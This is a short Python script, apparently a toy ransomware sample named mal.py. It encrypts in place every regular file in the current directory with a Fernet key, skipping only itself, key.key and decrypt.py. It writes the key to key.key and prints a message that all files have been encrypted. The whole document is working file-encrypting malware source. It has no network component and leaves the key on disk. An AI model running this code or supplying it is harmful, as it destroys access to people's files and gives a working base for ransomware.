import os
from cryptography.fernet import Fernet

allfiles=[]
for file in os.listdir():
    if file=="mal.py" or file=="key.key" or file=="decrypt.py":
        continue
    if os.path.isfile(file):
        allfiles.append(file)
print(allfiles)

key=Fernet.generate_key()
with open("key.key","wb") as thekey:
    thekey.write(key)
for file in allfiles:
    with open(file,"rb") as thefile:
        content=thefile.read()
    content_encr = Fernet(key).encrypt(content)
    with open(file,"wb") as thefile:
        thefile.write(content_encr)
print("All your files has been Encrypted.")
